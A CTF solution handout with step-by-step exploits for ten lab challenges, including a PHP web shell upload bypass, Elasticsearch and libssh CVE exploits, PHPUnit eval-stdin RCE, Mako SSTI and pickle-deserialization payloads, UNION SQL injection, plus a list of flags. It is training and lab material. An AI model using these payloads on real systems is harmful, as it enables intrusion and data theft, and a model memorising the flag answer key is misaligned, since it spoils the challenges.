# CyberEDU and Web Pentest CTF Solutions

A cleaned, consolidated handout built from the PowerPoint walkthroughs and the four web_pen writeups added by the user.

> Use these steps only against your own authorized CyberEDU or CTF lab instances. If a target rotates, replace only the host:port and keep the exploit flow the same.

## Contents

- [Part I - CyberEDU Exploitation Labs](#part-i---cyberedu-exploitation-labs)
- [1. Bolt](#1-bolt)
- [2. Elastic](#2-elastic)
- [3. libssh](#3-libssh)
- [4. php-unit](#4-php-unit)
- [5. nodiff-backdoor](#5-nodiff-backdoor)
- [6. Shark](#6-shark)
- [Part II - Web Pentest and Forensics Writeups](#part-ii---web-pentest-and-forensics-writeups)
- [7. Schematics SQLi](#7-schematics-sqli)
- [8. sweet-and-sour](#8-sweet-and-sour)
- [9. online](#9-online)
- [10. authorization](#10-authorization)
- [Quick Reference Flags](#quick-reference-flags)

## General Notes

Flags use the format CTF{sha256}.

The commands below assume a Kali or similar Linux environment with curl, nmap, grep, unzip, and dirsearch available.

For the Bolt lab, the slide deck clearly shows a successful weak-credential login to the Bolt admin panel, but the exact password text is not recoverable from the extracted slides. Every later step in that lab is precise.

## Part I - CyberEDU Exploitation Labs

These are the six labs we solved first: Bolt, Elastic, libssh, php-unit, nodiff-backdoor, and Shark.

## 1. Bolt

Target from the deck: http://35.246.170.233:31064/

Goal: identify the Bolt CMS admin panel, authenticate with the weak lab credential shown in the slides, bypass the upload restriction, and execute commands through a renamed PHP shell.

### Recon and fingerprinting

Step 1. Browse to the home page.

Step 2. View the page source. The footer text reveals that the site is built with Bolt CMS. That clue matters because Bolt commonly exposes its admin area at /bolt.

```text
Open in a browser: http://35.246.170.233:31064/
Then inspect the source or directly browse to: http://35.246.170.233:31064/bolt/login
```

Step 3. The deck shows a successful login as the admin user. Use the current lab credential from the live platform if the password is not obvious from the challenge UI.

### Weaponizing the file manager

Step 4. After logging in, open File Management in the left navigation menu.

Step 5. Prepare a simple one-parameter web shell locally.

```text
<?php echo system($_GET['cmd']);?>
```

Step 6. Save that file as rce.html, not rce.php. The upload form blocks PHP extensions but allows HTML.

Step 7. Upload rce.html through the Bolt file manager. The deck shows the upload succeeding once the file uses the .html extension.

Step 8. Click the uploaded file so Bolt opens it in the editor. From the Options menu, rename rce.html to rce.php.

Why the bypass works: the upload filter validates the file extension during upload, but the file manager later allows a rename that turns the already-uploaded content into server-executable PHP.

### Getting the flag

Step 9. Test command execution first with a harmless command.

```text
http://35.246.170.233:31064/files/rce.php?cmd=id
```

Step 10. Confirm the file location and working directory if needed.

```text
http://35.246.170.233:31064/files/rce.php?cmd=ls%20-la
```

Step 11. Read the flag file.

```text
http://35.246.170.233:31064/files/rce.php?cmd=cat%20/flag.txt
```

**Flag:** `CTF{b12e3b34c581d4f3c66c00cc7f8dabec8838dab0acf26c2cfbe2f7d291326f75}`

## 2. Elastic

Updated target from the user: http://34.40.1.122:32344/

Goal: confirm the old Elasticsearch version, use the CVE-2015-5531 file-read proof of concept, and pull the flag from the exploit output.

### Simplified solution

Step 1. Query the root page and confirm the version.

```text
curl -s http://34.40.1.122:32344/ | tee root.json
```

The working lab instance returns Elasticsearch version 1.3.4. That is old enough for the snapshot file-read issue used in this challenge.

Step 2. Copy the public exploit from ExploitDB.

```text
searchsploit -m 38383
```

Step 3. Clean the copied file. The packaged copy includes markdown above the real Python code, so strip everything before the shebang and stop at the next code fence.

````text
awk 'f{if(/^```/){exit} print} /^#!/{f=1; print}' 38383.py > elastic_clean.py
chmod +x elastic_clean.py
````

Step 4. Patch the hardcoded port from 9200 to the rotated lab port 32344.

```text
sed -i 's/^port = 9200$/port = 32344/' elastic_clean.py
```

Step 5. Run the exploit against /etc/passwd and save the output.

```text
python2 elastic_clean.py 34.40.1.122 /etc/passwd | tee elastic.out
```

Important: pass only the IP address to the script. Do not include http:// and do not include :32344, because the script adds the scheme and port itself.

Step 6. Extract the flag from the output.

```text
grep -o "CTF{[^}]*}" elastic.out
```

Why this works: CVE-2015-5531 is an arbitrary file-read issue in old Elasticsearch snapshot handling. The exploit reads /etc/passwd to prove file disclosure, and in this lab the flag is appended in the same output.

**Flag:** `CTF{265b92ed0091f139fdcd438196426f205fed9b14bce765bafd8344b1d96183e5}`

## 3. libssh

Target from the deck: 34.141.12.127:31367

Goal: fingerprint the SSH service, identify vulnerable libssh, and use the CVE-2018-10993 authentication bypass to execute a command without valid credentials.

### Version discovery

Step 1. Scan the port with service and default script detection enabled.

```text
nmap -sV -sC -p 31367 34.141.12.127 -Pn
```

Step 2. Confirm that the service reports libssh 0.8.3. The deck screenshot shows that exact version.

### Exploitation

Step 3. Save the proof of concept referenced in the deck to a local file named libssh.py.

```text
Reference from the slide: https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d
```

Step 4. Run the exploit exactly as shown in the slide.

```text
python3 libssh.py 34.141.12.127 -p 31367 -c "cd ..;cat flag.txt"
```

Why it works: CVE-2018-10993 is a server-side state machine flaw in libssh. A malicious client can send a success message out of order and convince the server that authentication already succeeded.

The command in the deck first moves up one directory and then reads flag.txt, which implies the flag is not in the initial working directory.

**Flag:** `CTF{754a4874399c6c15f6f12d31bccb438d1d42b540e5cec9c2371a831bb1eabeed}`

## 4. php-unit

Target from the deck: http://34.141.12.127:32017/

Goal: enumerate the web application, identify an exposed old PHPUnit installation, and exploit eval-stdin.php to execute PHP from the request body.

### Enumeration

Step 1. Run a directory brute-force scan against the web root.

```text
dirsearch -u http://34.141.12.127:32017
```

Step 2. Focus on the interesting hits shown in the deck.

```text
/composer.json
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

Step 3. Open composer.json and confirm the installed PHPUnit version.

```text
curl -s http://34.141.12.127:32017/composer.json
```

The deck shows phpunit/phpunit version 5.6.2. That version is vulnerable to CVE-2017-9841 when eval-stdin.php is web-accessible.

### Exploitation

Step 4. Send PHP code in the POST body to the vulnerable utility script.

```text
curl -s -X POST --data "<?php system('cat /flag.txt');?>" http://34.141.12.127:32017/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

Why it works: eval-stdin.php is a test helper that should never be reachable from the web. When exposed, it evaluates attacker-supplied PHP from standard input.

**Flag:** `CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}`

## 5. nodiff-backdoor

Target from the deck: http://34.107.45.207:30148/

Goal: locate a leaked backup archive, review the source code, identify the hidden command-execution backdoor, and invoke it with the correct parameter names.

### Source code acquisition

Step 1. Enumerate the site until you find backup.zip.

```text
dirsearch -u http://34.107.45.207:30148
```

Step 2. Download and extract the archive.

```text
wget http://34.107.45.207:30148/backup.zip
unzip backup.zip -d backup
cd backup
```

### Backdoor discovery

Step 3. Search the PHP source tree for dangerous execution functions.

```text
grep -R "shell_exec(" .
```

Step 4. The deck identifies the malicious code in wp-content/themes/twentytwentytwo/functions.php.

Step 5. Read that file and identify the trigger logic. The backdoor runs only when welldone equals knockknock, and it takes the operating-system command from the shazam parameter.

### Triggering the backdoor

Step 6. Confirm code execution with a safe command.

```text
curl "http://34.107.45.207:30148/?welldone=knockknock&shazam=id"
```

Step 7. Read the flag file exactly as the deck demonstrates.

```text
curl "http://34.107.45.207:30148/?welldone=knockknock&shazam=cat%20flag.php"
```

Why it works: the leaked backup gives you the server-side code, so you do not need to guess the hidden parameters. You can read the malicious logic directly and replay the exact trigger conditions.

**Flag:** `CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}`

## 6. Shark

Target from the deck: http://35.198.152.73:30806/

Goal: confirm server-side template injection, infer the Python templating context, and use a Mako-style payload to read the flag.

### Confirming SSTI

Step 1. Open the page and use the input field named Shark name.

Step 2. Submit the following probe payload.

```text
${7*7}
```

Step 3. If the server responds with Hello 49, then the expression is being evaluated server-side and SSTI is confirmed.

Step 4. Check the response headers for technology clues.

```text
curl -I http://35.198.152.73:30806/
```

The deck identifies Werkzeug on a Python stack and then pivots to a Mako-style payload from the SSTI reference page.

### Reading the flag

Step 5. Use a short command-execution payload to prove you can list files.

```text
${__import__('os').popen('ls /').read()}
```

Step 6. Locate likely flag paths from the template context.

```text
${__import__('os').popen('find / -name "flag*" 2>/dev/null').read()}
```

Step 7. Read the discovered flag path.

```text
${__import__('os').popen('cat /home/ctf/flag').read()}
```

Why it works: the template evaluates Python expressions server-side. Importing os and calling popen gives command output directly in the rendered page.

**Flag:** `CTF{4b08602e0090f81707b98ca687a5cacfd32888ffceef1d3cff2d99e6034b1e58}`

## Part II - Web Pentest and Forensics Writeups

These sections were added from the four Word writeups in C:\Users\Predator\Downloads\Documents\web_pen.

## 7. Schematics SQLi

Source: Schematics_SQLi_Guide.docx

Target from the writeup: http://34.89.220.140:30373/

Goal: exploit a UNION-based SQL injection in the logged-in product search and reconstruct the flag from MySQL information_schema metadata.

### Recon and injection proof

Step 1. Register a throwaway account at /register.php and log in.

Step 2. In the Product Name search field, compare a false condition with a true condition.

```text
a' AND '1'='2
a' AND '1'='1
```

The false condition returns no products, while the true condition returns the normal product list. That confirms SQL injection.

### UNION extraction

Step 3. Find the column count. The four-column UNION payload is the first one that renders correctly.

```text
zzz' UNION SELECT 1,2,3,4-- -
```

Step 4. Identify the visible column.

```text
zzz' UNION SELECT 'A','B','C','D'-- -
```

The page prints B, so column 2 is the displayed column.

Step 5. Dump table names from the current database.

```text
zzz' UNION SELECT 1,group_concat(table_name SEPARATOR 0x0a),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

One table name contains the first part of the flag: CTF{1nformat1on_sch3ma_c4n_

Step 6. Dump the column names from that flag-shaped table.

```text
zzz' UNION SELECT 1,group_concat(column_name SEPARATOR 0x0a),3,4 FROM information_schema.columns WHERE table_schema=database() AND table_name LIKE 'CTF{%'-- -
```

The useful columns are cont41n_, us3ful, and _d4t4}. Concatenate the table name with those column names in order.

Why it works: information_schema exposes table and column metadata. In this challenge, the secret is hidden in schema names rather than in row data.

**Flag:** `CTF{1nformat1on_sch3ma_c4n_cont41n_us3ful_d4t4}`

## 8. sweet-and-sour

Source: sweet_and_sour_writeup.docx

Target from the writeup: http://35.242.246.87:32164/

Goal: abuse insecure Python pickle deserialization in a client-controlled Flask cookie to execute a command and reflect the output in the dashboard.

### Cookie analysis

Step 1. Request the root page and look for the data cookie.

```text
curl -i -s http://35.242.246.87:32164/ | grep -i set-cookie
```

The cookie value begins with gAN after Base64 encoding, which decodes to a Python pickle protocol marker. The original pickle contains the string Try Harder!.

### Malicious pickle

Step 2. Generate a pickle payload whose __reduce__ calls eval and returns command output.

```text
COOKIE=$(python3 -c "import pickle,base64; print(base64.b64encode(pickle.dumps(type('x',(),{'__reduce__':lambda s:(eval,(\"__import__('os').popen('cat flag').read()\",))})())).decode())")
```

Step 3. Send the malicious cookie to /dashboard and extract the flag.

```text
curl -s -b "data=$COOKIE" http://35.242.246.87:32164/dashboard | grep -o 'CTF{[^}]*}'
```

Why it works: pickle.loads executes attacker-controlled reduce gadgets. The application then renders the deserialized value, so command output is visible in the response.

**Flag:** `CTF{ccc1ccef217ed19c492bdada049ad2b0fbf1adcb72a92f13ab153aae068f797f}`

## 9. online

Source: online_ctf_writeup.docx

Artifact from the writeup: online.pcapng

Goal: recover a leaked secret from cleartext HTTP traffic in a packet capture. No encryption needs to be broken.

### Packet triage

Step 1. Open online.pcapng in Wireshark and check Statistics > Protocol Hierarchy.

Step 2. Filter for readable HTTP requests.

```text
http.request
```

The important traffic is a set of cleartext POST requests to online crypto/hash tools, including convertstring.com and txtwizard.net.

### Secret recovery

Step 3. Follow the HTTP stream for the convertstring.com MD5 POST. The submitted input contains the complete leaked value.

```text
UlBGUHtxcTU0NXNvczEyc3E2MDhxbm44cDIwMXM1MHM5NXA4NTIwb3JwOXM3NDRuMzU3M28xcXAwb3A1M3ByMDE5NzI2fQ==
```

Step 4. Base64-decode the value.

```text
echo 'UlBGUHtxcTU0NXNvczEyc3E2MDhxbm44cDIwMXM1MHM5NXA4NTIwb3JwOXM3NDRuMzU3M28xcXAwb3A1M3ByMDE5NzI2fQ==' | base64 -d
```

The result is RPFP{qq545sos12sq608qnn8p201s50s95p8520orp9s744n3573o1qp0op53pr019726}.

Step 5. Apply ROT13 to recover the native ECSC flag.

```text
echo 'RPFP{qq545sos12sq608qnn8p201s50s95p8520orp9s744n3573o1qp0op53pr019726}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

Why it works: the secret was submitted to an online encryption tool over plain HTTP, so the plaintext input is visible in the capture.

**Flag:** `ECSC{dd545fbf12fd608daa8c201f50f95c8520bec9f744a3573b1dc0bc53ce019726}`

## 10. authorization

Source: authorization_writeup.docx

Target from the writeup: http://34.159.85.111:30398/

Goal: enumerate a Flask application, find leaked credentials, request a Flask-JWT token, and use it against the protected /secrets endpoint.

### Recon

Step 1. Run directory enumeration.

```text
dirsearch -u http://34.159.85.111:30398
```

Important hits from the writeup: /auth returns 405 on GET, /client_secrets.json returns credentials, /console exposes a Werkzeug debugger, /robots.txt points to /auth, and /secrets returns 401.

Step 2. Read the exposed credentials file.

```text
curl -s http://34.159.85.111:30398/client_secrets.json
```

The writeup shows admin:admin.

### JWT flow

Step 3. POST the credentials to /auth and capture the access_token.

```text
TOKEN=$(curl -s -X POST http://34.159.85.111:30398/auth -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin"}' | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
```

Step 4. Use Flask-JWT's expected Authorization header format. This application expects JWT, not Bearer.

```text
curl -s http://34.159.85.111:30398/secrets -H "Authorization: JWT $TOKEN"
```

Why it works: the application leaks valid credentials and protects /secrets with a normal Flask-JWT token check. Once you authenticate, the server returns the flag directly.

**Flag:** `returned by /secrets as CTF{...}; the source writeup did not include the exact hash.`

## Quick Reference Flags

Bolt: CTF{b12e3b34c581d4f3c66c00cc7f8dabec8838dab0acf26c2cfbe2f7d291326f75}

Elastic: CTF{265b92ed0091f139fdcd438196426f205fed9b14bce765bafd8344b1d96183e5}

libssh: CTF{754a4874399c6c15f6f12d31bccb438d1d42b540e5cec9c2371a831bb1eabeed}

php-unit: CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}

nodiff-backdoor: CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}

shark: CTF{4b08602e0090f81707b98ca687a5cacfd32888ffceef1d3cff2d99e6034b1e58}

Schematics SQLi: CTF{1nformat1on_sch3ma_c4n_cont41n_us3ful_d4t4}

sweet-and-sour: CTF{ccc1ccef217ed19c492bdada049ad2b0fbf1adcb72a92f13ab153aae068f797f}

online: ECSC{dd545fbf12fd608daa8c201f50f95c8520bec9f744a3573b1dc0bc53ce019726}

authorization: returned by /secrets as CTF{...}; exact hash was not captured in the source writeup.
